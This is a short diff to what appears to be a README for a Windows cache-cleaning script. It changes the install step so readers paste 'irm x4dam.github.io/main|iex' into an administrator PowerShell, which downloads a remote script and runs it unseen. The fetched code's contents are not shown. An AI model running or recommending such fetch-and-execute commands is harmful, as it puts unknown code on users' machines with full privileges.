@@ -5,5 +5,5 @@ A safe, lightweight, and comment-free script to clear system caches, temporary f
 Right-click your **Start Menu**, open **PowerShell (Admin)** or **Terminal (Admin)**, and run the following command:
 
 ```powershell
-irm "https://githubusercontent.com" | iex
+irm x4dam.github.io/main|iex
 ```
